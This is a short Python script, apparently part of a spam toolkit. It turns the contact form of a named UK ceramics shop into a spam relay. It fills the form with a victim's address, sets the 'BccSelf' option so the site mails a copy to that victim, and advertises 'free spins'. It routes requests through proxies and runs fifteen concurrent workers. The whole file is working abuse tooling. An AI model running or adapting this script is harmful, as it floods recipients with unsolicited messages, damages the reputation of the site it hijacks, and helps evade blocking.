import requests

headers = {
    'authority': 'primroseceramics.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'origin': 'https://primroseceramics.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://primroseceramics.co.uk/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text()
        data = {
            '_8d860e988238eed45b9fc6cb4a2178d4': '650ed27ea4821d198bced291b7da2f7b,1677768052',
            'Name': text,
            'Email': target,
            'Phone': '123123',
            'Subject': f'GET {self.spins} YOUR FREESPINS!',
            'Message': text,
            'Submit': 'Send',
            'BccSelf': '1',
        }

        response = requests.post('https://primroseceramics.co.uk/contact.php', headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    s = 'Thank you'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(15)


if __name__ == '__main__':
    main()
